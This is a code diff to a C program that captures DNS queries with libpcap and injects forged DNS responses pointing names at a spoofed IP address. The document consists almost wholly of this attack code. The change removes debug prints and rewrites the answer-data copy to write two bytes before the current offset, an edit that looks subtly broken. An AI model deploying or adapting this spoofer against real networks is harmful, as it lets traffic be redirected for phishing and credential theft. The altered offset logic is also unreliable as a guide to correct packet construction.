@@ -2,18 +2,15 @@
 
 #include <arpa/inet.h>
 #include <net/ethernet.h>
-#include <netinet/ether.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <pcap.h>
-#include <pcap/pcap.h>
 #include <stddef.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <strings.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <time.h>
@@ -253,8 +250,6 @@ void send_dns_spoof_response(pcap_t *handle, const struct ether_header *ori_eth_
   memcpy(dns_resp_paylaod + DNS_HDR_SIZE, ori_dns_payload + ori_qname_offset_in_dns_payload,
          ori_question_section_size);
 
-  printf("DEBUG: QNAME: %s\n", ori_dns_payload + ori_qname_offset_in_dns_payload);
-
   // --- 6. Add DNS Answer Section ---
   // the answer section starts after the question section
   uint8_t *current_offset_in_dns_payload =
@@ -283,8 +278,11 @@ void send_dns_spoof_response(pcap_t *handle, const struct ether_header *ori_eth_
     free(response_packet);
     return;
   }
-  memcpy(current_offset_in_dns_payload, &spoofed_ip_addr.s_addr, sizeof(spoofed_ip_addr.s_addr));
-  current_offset_in_dns_payload += sizeof(spoofed_ip_addr.s_addr);
+
+  // memcpy(current_offset_in_dns_payload, &spoofed_ip_addr.s_addr, sizeof(spoofed_ip_addr.s_addr));
+  memcpy(current_offset_in_dns_payload - 2, &spoofed_ip_addr.s_addr, sizeof(uint32_t));
+  // current_offset_in_dns_payload += sizeof(spoofed_ip_addr.s_addr);
+  current_offset_in_dns_payload += sizeof(uint32_t);
 
   // --- 7. Finalize Lenghts and Checksum ---
   int dns_resp_length   = (int)(current_offset_in_dns_payload - dns_resp_paylaod);
@@ -299,10 +297,6 @@ void send_dns_spoof_response(pcap_t *handle, const struct ether_header *ori_eth_
 
   if (pcap_inject(handle, response_packet, total_packet_len) == -1) {
     fprintf(stderr, "Error: Injecting packet: %s\n", pcap_geterr(handle));
-  } else {
-    // TODO: Think what to do here.
-    // Printing something might be costly.
-    printf("Injected!");
   }
 }
 
@@ -519,7 +513,6 @@ void dns_packet_handler(u_char *user, const struct pcap_pkthdr *pkt_header,
   // Store the initial offset of the QNAME for the response
   int initial_qname_offset_in_dns_payload = current_dns_offset;
 
-  printf("DEBUG: QNAME: %s\n", dns_payload + initial_qname_offset_in_dns_payload);
   // Advance past the QNAME to get to QTYPE and QCLASS
   current_dns_offset += name_len_in_packet;
 
